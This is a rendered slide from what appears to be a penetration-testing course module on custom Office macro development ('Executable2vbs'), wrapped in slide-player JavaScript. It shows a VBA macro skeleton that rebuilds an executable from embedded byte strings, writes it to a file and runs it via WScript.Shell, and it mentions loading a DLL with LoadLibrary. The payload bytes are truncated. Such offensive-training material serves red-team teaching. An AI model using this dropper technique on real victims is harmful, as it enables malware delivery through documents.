(function(){var loadHandler=window['sl_{D8C1971F-D8E7-4ADE-AF2A-E4D7C02A081C}'];loadHandler&&loadHandler(80, '<div id="spr0_24d2588"><div id="spr1_24d2588" class="kern slide"><img id="img0_24d2588" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg27_24d2588" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_24d2588" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;"><span id="txt0_24d2588" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg28_24d2588" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_24d2588" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;"><span id="txt1_24d2588" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl4_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;" style="left:905.096px;top:313.837px;"><div id="svg29_24d2588" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr5_24d2588" style="left:905.096px;top:313.837px;"><div style="width:0px;"><a id="hl5_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;"><span id="txt2_24d2588" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr6_24d2588" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt3_24d2588" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 1, Module 1 - Caendra Inc. © 2020</span></div></div><a id="hl6_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;" style="left:905.732px;top:360.719px;"><div id="svg30_24d2588" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_24d2588" style="left:905.732px;top:360.719px;"><div style="width:0px;"><a id="hl7_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;"><span id="txt4_24d2588" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="svg31_24d2588" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl8_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg34_24d2588" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr8_24d2588" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl9_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;"><span id="txt5_24d2588" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl10_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg35_24d2588" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr9_24d2588" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl11_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;"><span id="txt6_24d2588" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl12_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;" style="left:905.096px;top:313.837px;"><div id="svg36_24d2588" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr10_24d2588" style="left:905.096px;top:313.837px;"><div style="width:0px;"><a id="hl13_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;"><span id="txt7_24d2588" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl14_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;" style="left:905.732px;top:360.719px;"><div id="svg37_24d2588" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr11_24d2588" style="left:905.732px;top:360.719px;"><div style="width:0px;"><a id="hl15_24d2588" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;"><span id="txt8_24d2588" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_24d2588" class="kern slide"><div id="svg38_24d2588" style="left:34.833px;top:151.332px;"><svg width="514" height="351" viewBox="0 0 514 351"><path fill="#000000" d="M0,0 h513.206 v350.668 h-513.206 Z"/></svg></div><div id="spr12_24d2588" style="left:34.833px;top:151.332px;"><div style="width:0px;"><span id="txt9_24d2588" class="nokern" data-width="36.653645" style="left:9.6px;top:2.403px;">Sub DoIt()</span></div><div style="width:0px;"><span id="txt10_24d2588" class="nokern" data-width="40.319008" style="left:105.6px;top:10.274px;">Dim strFile</span></div><div style="width:0px;"><span id="txt11_24d2588" class="nokern" data-width="73.307289" style="left:105.6px;top:26.274px;">strFile = &quot;file.exe&quot;</span></div><div style="width:0px;"><span id="txt12_24d2588" class="nokern" data-width="58.645832" style="left:105.6px;top:34.274px;">DumpFile strFile</span></div><div style="width:0px;"><span id="txt13_24d2588" class="nokern" data-width="54.980469" style="left:105.6px;top:42.274px;">RunFile strFile</span></div><div style="width:0px;"><span id="txt14_24d2588" class="nokern" data-width="25.657551" style="left:9.6px;top:50.274px;">End Sub</span></div><div style="width:0px;"><span id="txt15_24d2588" class="nokern" data-width="87.968750" style="left:9.6px;top:66.274px;">Sub RunFile(strFilename)</span></div><div style="width:0px;"><span id="txt16_24d2588" class="nokern" data-width="21.992188" style="left:105.6px;top:74.274px;">Dim sh</span></div><div style="width:0px;"><span id="txt17_24d2588" class="nokern" data-width="139.283844" style="left:105.6px;top:90.274px;">Set sh = CreateObject(&quot;WScript.Shell&quot;)</span></div><div style="width:0px;"><span id="txt18_24d2588" class="nokern" data-width="65.976563" style="left:105.6px;top:98.274px;">sh.Run strFilename</span></div><div style="width:0px;"><span id="txt19_24d2588" class="nokern" data-width="25.657551" style="left:9.6px;top:106.274px;">End Sub</span></div><div style="width:0px;"><span id="txt20_24d2588" class="nokern" data-width="120.957031" style="left:9.6px;top:122.274px;">Sub WriteBytes(objFile, strBytes)</span></div><div style="width:0px;"><span id="txt21_24d2588" class="nokern" data-width="43.984375" style="left:105.6px;top:130.274px;">Dim aNumbers</span></div><div style="width:0px;"><span id="txt22_24d2588" class="nokern" data-width="32.988281" style="left:105.6px;top:138.274px;">Dim iIter</span></div><div style="width:0px;"><span id="txt23_24d2588" class="nokern" data-width="95.299477" style="left:105.6px;top:154.274px;">aNumbers = split(strBytes)</span></div><div style="width:0px;"><span id="txt24_24d2588" class="nokern" data-width="175.937500" style="left:105.6px;top:162.274px;">for iIter = lbound(aNumbers) to ubound(aNumbers)</span></div><div style="width:0px;"><span id="txt25_24d2588" class="nokern" data-width="124.622391" style="left:201.6px;top:170.274px;">objFile.Write Chr(aNumbers(iIter))</span></div><div style="width:0px;"><span id="txt26_24d2588" class="nokern" data-width="14.661458" style="left:105.6px;top:178.274px;">next</span></div><div style="width:0px;"><span id="txt27_24d2588" class="nokern" data-width="25.657551" style="left:9.6px;top:186.274px;">End Sub</span></div><div style="width:0px;"><span id="txt28_24d2588" class="nokern" data-width="80.638016" style="left:9.6px;top:202.274px;">Sub DumpFile1(objFile)</span></div><div style="width:0px;"><span id="txt29_24d2588" class="nokern" data-width="381.197906" style="left:105.6px;top:210.274px;">WriteBytes objFile, &quot;77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0&quot;</span></div><div style="width:0px;"><span id="txt30_24d2588" class="nokern" data-width="381.197906" style="left:105.6px;top:218.274px;">WriteBytes objFile, &quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 128 0 0 0 14 31 186 14 0 180 9 205&quot;</span></div><div style="width:0px;"><span id="txt31_24d2588" class="nokern" data-width="388.528625" style="left:105.6px;top:226.274px;">WriteBytes objFile, &quot;33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111&quot;</span></div><div style="width:0px;"><span id="txt32_24d2588" class="nokern" data-width="381.197906" style="left:105.6px;top:234.274px;">WriteBytes objFile, &quot;116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10&quot;</span></div><div style="width:0px;"><span id="txt33_24d2588" class="nokern" data-width="377.532532" style="left:105.6px;top:242.274px;">WriteBytes objFile, &quot;36 0 0 0 0 0 0 0 80 69 0 0 76 1 3 0 101 114 248 88 0 0 0 0 0 0 0 0 224 0 2 1 11 1&quot;</span></div><div style="width:0px;"><span id="txt34_24d2588" class="nokern" style="left:9.6px;top:250.274px;">…</span></div><div style="width:0px;"><span id="txt35_24d2588" class="nokern" data-width="91.634109" style="left:9.6px;top:266.274px;">Sub DumpFile(strFilename)</span></div><div style="width:0px;"><span id="txt36_24d2588" class="nokern" data-width="36.653645" style="left:105.6px;top:274.274px;">Dim objFSO</span></div><div style="width:0px;"><span id="txt37_24d2588" class="nokern" data-width="40.319008" style="left:105.6px;top:282.274px;">Dim objFile</span></div><div style="width:0px;"><span id="txt38_24d2588" class="nokern" data-width="201.595047" style="left:105.6px;top:298.274px;">Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span></div><div style="width:0px;"><span id="txt39_24d2588" class="nokern" data-width="201.595047" style="left:105.6px;top:306.274px;">Set objFile = objFSO.OpenTextFile(strFilename, 2, true)</span></div><div style="width:0px;"><span id="txt40_24d2588" class="nokern" data-width="62.311195" style="left:105.6px;top:314.274px;">DumpFile1 objFile</span></div><div style="width:0px;"><span id="txt41_24d2588" class="nokern" data-width="62.311195" style="left:105.6px;top:322.274px;">DumpFile2 objFile</span></div><div style="width:0px;"><span id="txt42_24d2588" class="nokern" style="left:9.6px;top:330.274px;">…</span></div></div><div id="spr13_24d2588" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt43_24d2588" data-width="589.572266" style="left:9.6px;top:27.438px;">1.3.1 Custom macro development</span></div></div><div id="svg39_24d2588" style="left:577.945px;top:152.23px;"><svg width="291" height="28" viewBox="-0.167 -0.167 291 28"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" d="M0.167,0.167 h289.781 v26.909 h-289.781 Z"/></svg></div><div id="spr14_24d2588" style="left:578.112px;top:152.397px;"><div style="width:0px;"><span id="txt44_24d2588" class="nokern" data-width="241.397644" style="left:9.767px;top:3.167px;">Executing the “re-assembled” executable.</span></div></div><div id="svg10_24d2588" style="left:282.428px;top:165.018px;"><svg width="297" height="83" viewBox="-0.887 -0.517 297 83"><g fill="none"><g transform="translate(0.127808,0.483388)"><g fill="#0070c0" stroke="none" transform="translate(-0.127808,-0.483393)"><path stroke="#0070c0" stroke-width="1" stroke-linecap="butt" transform="translate(0.127808,0.483393)" d="M294.836,0 L6.907,76.128"/><path transform="matrix(-0.966779,0.255613,-0.255613,-0.966779,294.963715,0.48339)" d="M304.967,0 L297.029,3.969 V-3.969 Z"/></g></g></g></svg></div><div id="svg40_24d2588" style="left:577.945px;top:188.918px;"><svg width="291" height="45" viewBox="-0.167 -0.167 291 45"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" d="M0.167,0.167 h289.781 v44.133 h-289.781 Z"/></svg></div><div id="spr15_24d2588" style="left:578.112px;top:189.084px;"><div style="width:0px;"><span id="txt45_24d2588" class="nokern" data-width="265.167511" style="left:9.767px;top:3.167px;">The executable is embedded inside the macro</span></div><div style="width:0px;"><span id="txt46_24d2588" class="nokern" data-width="205.080078" style="left:9.767px;top:20.22px;">in the form of hex dumps in strings.</span></div></div><div id="svg41_24d2588" style="left:577.945px;top:311.293px;"><svg width="291" height="179" viewBox="-0.167 -0.167 291 179"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" stroke-dasharray="1.333,1" d="M0.167,0.167 h289.781 v177.595 h-289.781 Z"/></svg></div><div id="spr16_24d2588" style="left:578.112px;top:311.459px;"><div style="width:0px;"><span id="txt47_24d2588" class="nokern" data-width="196.668671" style="left:9.767px;top:3.167px;">Here we explain the macro’s main</span></div><div style="width:0px;"><span id="txt48_24d2588" class="nokern" data-width="267.464661" style="left:9.767px;top:20.22px;">functionality. In the case of an embedded DLL,</span></div><div style="width:0px;"><span id="txt49_24d2588" class="nokern relpos" data-width="75.790657" style="left:9.767px;top:37.273px;">LoadLibrary </span><span id="txt50_24d2588" class="nokern relpos" data-width="90.700218" style="left:9.76px;top:37.273px;">would be called</span><span id="txt51_24d2588" class="nokern relpos" style="left:9.753px;top:37.273px;"> </span><span id="txt52_24d2588" class="nokern relpos" data-width="103.990517" style="left:9.747px;top:37.273px;">to load our library</span></div><div style="width:0px;"><span id="txt53_24d2588" class="nokern" data-width="261.815430" style="left:9.767px;top:54.327px;">in the Office application’s process. To do this,</span></div><div style="width:0px;"><span id="txt54_24d2588" class="nokern" data-width="255.583206" style="left:9.767px;top:71.38px;">the following should be added in our macro,</span></div><div style="width:0px;"><span id="txt55_24d2588" class="nokern" data-width="116.788071" style="left:9.767px;top:88.433px;">among other things.</span></div><div style="width:0px;"><span id="txt56_24d2588" class="nokern" data-width="234.290115" style="left:9.767px;top:106.622px;">Private Declare Function LoadLibrary Lib</span></div><div style="width:0px;"><span id="txt57_24d2588" class="nokern" data-width="222.575607" style="left:9.767px;top:119.409px;">&quot;KERNEL32&quot; Alias &quot;LoadLibraryA&quot; (ByVal</span></div><div style="width:0px;"><span id="txt58_24d2588" class="nokern" data-width="175.717590" style="left:9.767px;top:132.195px;">strFileName As String) As Long</span></div><div style="width:0px;"><span id="txt59_24d2588" class="nokern" data-width="234.290115" style="left:9.767px;top:144.982px;">Private Declare Function FreeLibrary Lib</span></div><div style="width:0px;"><span id="txt60_24d2588" class="nokern" data-width="251.861862" style="left:9.767px;top:157.769px;">&quot;KERNEL32&quot; (ByVal hLibrary As Long) As Long</span></div></div><div id="svg18_24d2588" style="left:123.445px;top:210.318px;"><svg width="456" height="154" viewBox="-1.084 -0.525 456 154"><g fill="none"><g transform="translate(0.15625,0.474955)"><g fill="#0070c0" stroke="none" transform="translate(-0.15625,-0.474955)"><path stroke="#0070c0" stroke-width="1" stroke-linecap="butt" transform="translate(0.15625,0.474955)" d="M453.594,0 L6.786,146.978"/><path transform="matrix(-0.949925,0.312479,-0.312479,-0.949925,453.749969,0.474962)" d="M477.505,0 L469.567,3.969 V-3.969 Z"/></g></g></g></svg></div><div id="svg42_24d2588" style="left:577.945px;top:250.105px;"><svg width="291" height="45" viewBox="-0.167 -0.167 291 45"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" d="M0.167,0.167 h289.781 v44.133 h-289.781 Z"/></svg></div><div id="spr17_24d2588" style="left:578.112px;top:250.272px;"><div style="width:0px;"><span id="txt61_24d2588" class="nokern" data-width="235.554077" style="left:9.767px;top:3.167px;">Writing the embedded executable to the</span></div><div style="width:0px;"><span id="txt62_24d2588" class="nokern" data-width="86.036469" style="left:9.767px;top:20.22px;">temporary file.</span></div></div><div id="svg26_24d2588" style="left:348.97px;top:271.505px;"><svg width="231" height="190" viewBox="-2.196 -0.613 231 190"><g fill="none"><g transform="translate(0.316488,0.387126)"><g fill="#0070c0" stroke="none" transform="translate(-0.316437,-0.387122)"><path stroke="#0070c0" stroke-width="1" stroke-linecap="butt" transform="translate(0.316437,0.387122)" d="M226.797,0 L5.531,180.895"/><path transform="matrix(-0.774198,0.632943,-0.632943,-0.774198,227.113281,0.387099)" d="M292.944,0 L285.006,3.969 V-3.969 Z"/></g></g></g></svg></div><div id="spr18_24d2588" style="left:832px;top:502px;"><div style="width:0px;"><span id="txt63_24d2588" class="nokern" data-width="40.013020" style="left:9.6px;top:7.998px;">|   p.81</span></div></div><div id="spr19_24d2588" style="left:34.833px;top:111.906px;"><div style="width:0px;"><span id="txt64_24d2588" data-width="179.658859" style="left:9.6px;top:3.52px;">Executable2vbs</span></div></div></div></div>');})();